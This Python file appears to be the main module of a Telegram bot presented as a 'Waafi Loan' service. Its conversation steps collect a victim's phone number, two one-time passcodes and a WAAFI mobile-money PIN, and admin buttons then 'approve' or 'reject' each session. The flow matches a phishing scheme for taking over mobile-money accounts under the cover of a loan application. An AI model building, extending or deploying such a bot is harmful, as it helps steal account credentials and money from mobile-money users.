from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackQueryHandler,
    filters
)


from handlers import (
    start,
    phone_number,
    otp_1,
    waafi_pin,
    otp_2
)


from states import (
    PHONE_NUMBER,
    OTP_1,
    WAAFI_PIN,
    OTP_2
)


from config import TOKEN



# ================= ADMIN APPROVE / REJECT =================

async def admin_action(update, context):

    query = update.callback_query

    await query.answer()


    data = query.data


    if data.startswith("approve_"):

        session = data.replace(
            "approve_",
            ""
        )


        await query.message.reply_text(
            text=(
                "✅ APPLICATION APPROVED\n\n"
                f"🆔 Session ID: {session}"
            )
        )


    elif data.startswith("reject_"):

        session = data.replace(
            "reject_",
            ""
        )


        await query.message.reply_text(
            text=(
                "❌ APPLICATION REJECTED\n\n"
                f"🆔 Session ID: {session}"
            )
        )



# ================= MAIN =================

def main():

    app = Application.builder().token(TOKEN).build()



    conversation = ConversationHandler(

        entry_points=[

            CommandHandler(
                "start",
                start
            )

        ],


        states={


            PHONE_NUMBER:[

                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    phone_number
                )

            ],


            OTP_1:[

                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    otp_1
                )

            ],


            WAAFI_PIN:[

                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    waafi_pin
                )

            ],


            OTP_2:[

                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    otp_2
                )

            ]

        },


        fallbacks=[]

    )



    app.add_handler(
        conversation
    )



    # ADMIN BUTTONS

    app.add_handler(
        CallbackQueryHandler(
            admin_action,
            pattern="^(approve_|reject_)"
        )
    )



    print(
        "🤖 Waafi Loan Learning Bot Running..."
    )



    app.run_polling()



if __name__ == "__main__":

    main()